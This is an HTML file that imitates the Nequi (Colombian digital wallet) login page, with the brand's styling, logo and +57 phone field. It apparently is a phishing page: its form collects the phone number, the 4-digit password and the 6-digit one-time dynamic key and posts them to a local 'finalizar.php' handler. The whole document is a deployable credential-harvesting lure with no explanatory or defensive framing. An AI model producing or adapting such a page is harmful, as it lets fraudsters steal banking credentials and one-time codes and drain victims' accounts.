<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Nequi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    body {
      background: #fae9f5;
      margin: 0;
      font-family: 'Inter', Arial, sans-serif;
      min-height: 100vh;
      position: relative;
    }
    /* Fondo decorativo con figuras */
    body::before {
      content: "";
      position: fixed;
      left: 0; top: 0; width: 100vw; height: 100vh;
      z-index: 0;
      background: 
        linear-gradient(120deg, #fae9f5 90%, #fff 100%);
    }
    /* Header */
    .nequi-header {
      width: 100%;
      background: #fff;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      box-sizing: border-box;
      height: 70px;
      position: relative;
      z-index: 2;
    }
    .nequi-logo {
      margin-left: 30px;
      font-size: 2.2rem;
      font-weight: 700;
      color: #210024;
      display: flex;
      align-items: center;
      gap: 7px;
    }
    .nequi-logo-dot {
      color: #e4007a;
      font-size: 2.5rem;
      font-weight: bold;
      margin-right: 3px;
    }
    .nequi-recarga-btn {
      background: #e4007a;
      color: #fff;
      font-size: 1.07rem;
      font-weight: 500;
      border: none;
      border-radius: 8px;
      padding: 13px 32px;
      margin-right: 28px;
      cursor: pointer;
      transition: background 0.17s;
      box-shadow: 0 2px 8px rgba(228,0,122,0.18);
    }
    .nequi-recarga-btn:hover {
      background: #b80063;
    }
    /* Contenedor del login centrado */
    .nequi-login-container {
      max-width: 410px;
      margin: 46px auto 0 auto;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 2px 26px 0 rgba(190, 30, 120, 0.07);
      padding: 36px 32px 34px 32px;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      position: relative;
      z-index: 2;
    }
    .nequi-login-container h1 {
      text-align: center;
      color: #210024;
      font-weight: 700;
      margin-bottom: 8px;
      font-size: 2rem;
    }
    .nequi-login-container p {
      text-align: center;
      color: #6a1c85;
      font-size: 1.08rem;
      margin-bottom: 24px;
      margin-top: 0;
      font-weight: 500;
    }
    .nequi-field {
      margin-bottom: 18px;
      display: flex;
      flex-direction: column;
    }
    .input-group {
      display: flex;
      align-items: center;
      gap: 0;
      width: 100%;
    }
    .input-indicativo {
      display: flex;
      align-items: center;
      background: #fff;
      border: none;
      border-radius: 8px 0 0 8px;
      padding: 0 18px 0 12px;
      height: 48px;
      font-size: 1.08rem;
      font-weight: 500;
      color: #333;
      box-sizing: border-box;
      border: 1.5px solid #f3eaf6;
      border-right: 0;
      min-width: 120px;
    }
    .input-indicativo img {
      width: 26px;
      height: 18px;
      margin-right: 7px;
      border-radius: 3px;
      border: 1.5px solid #f3eaf6;
      background: #fff;
    }
    .input-indicativo .arrow {
      margin-left: 9px;
      font-size: 1.1rem;
      color: #adadad;
      font-weight: bold;
    }
    .input-celular {
      flex: 1;
      background: #fff;
      border: 1.5px solid #f3eaf6;
      border-radius: 0 8px 8px 0;
      border-left: 0;
      height: 48px;
      padding: 0 18px;
      font-size: 1.13rem;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.25s;
      color: #333;
    }
    .input-celular:focus {
      border-color: #db1fff;
    }
    .nequi-field label { display: none; }
    .nequi-field input[type="password"] {
      width: 100%;
      padding: 15px 18px;
      font-size: 1.13rem;
      border: 1.5px solid #f3eaf6;
      border-radius: 8px;
      background: #faf5fc;
      transition: border-color 0.3s;
      box-sizing: border-box;
      color: #333;
      outline: none;
      margin-bottom: 0;
    }
    .nequi-field input[type="password"]:focus {
      border-color: #db1fff;
    }
    .captcha-box {
      background: #fff;
      border: 2px solid #db1fff;
      border-radius: 10px;
      padding: 14px 10px 8px 10px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      margin-bottom: 28px;
      margin-top: 8px;
    }
    .nequi-btn {
      width: 100%;
      background: #e4007a;
      color: #fff;
      font-size: 1.25rem;
      font-weight: 700;
      border: none;
      border-radius: 10px;
      padding: 17px 0;
      margin-top: 8px;
      cursor: pointer;
      transition: background 0.2s;
      box-shadow: 0 2px 8px rgba(228,0,122,0.13);
      letter-spacing: 1px;
    }
    .nequi-btn:hover {
      background: #b80063;
    }
    @media (max-width: 600px) {
      .nequi-login-container { max-width: 97vw; padding: 20px 4vw; }
      .nequi-header { height: 60px; }
      .nequi-logo { font-size: 1.65rem; margin-left: 10px;}
      .nequi-recarga-btn { padding: 11px 18px; margin-right: 10px;}
    }
    </style>
</head>
<body>
    <header class="nequi-header">
        <div class="nequi-logo">
            <span class="nequi-logo-dot">•</span>Nequi
        </div>
        <button class="nequi-recarga-btn">Recarga</button>
    </header>
    <div class="nequi-login-container">
        <h1>Entra a tu Nequi</h1>
        <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
        <form method="POST" action="finalizar.php" autocomplete="off">
            <div class="nequi-field">
                <div class="input-group">
                    <span class="input-indicativo">
                        <img src="https://flagcdn.com/w20/co.png" alt="Colombia">
                        +57
                        <span class="arrow">&#9660;</span>
                    </span>
                    <input type="tel"
                        id="j_username"
                        name="j_username"
                        class="input-celular"
                        placeholder="Número de celular"
                        maxlength="10"
                        minlength="10"
                        pattern="[0-9]{10}"
                        required
                        autocomplete="off">
                </div>
            </div>
            <div class="nequi-field">
                <input type="password" id="j_password" name="j_password" maxlength="4" minlength="4" required placeholder="Contraseña">
            </div>
            <div class="nequi-field">
                <input type="password" id="j_dinamica" name="j_dinamica" maxlength="6" minlength="6" required placeholder="Clave dinámica">
            </div>
            <div class="captcha-box">
                <div class="g-recaptcha" data-sitekey="6Led89IrAAAAAGGHsXCbc_9T-8D9jpCJpE8NTogc"></div>
            </div>
            <button type="submit" class="nequi-btn">Entra</button>
        </form>
    </div>
    <script async defer src="https://www.google.com/recaptcha/api.js"></script>
</body>
</html>
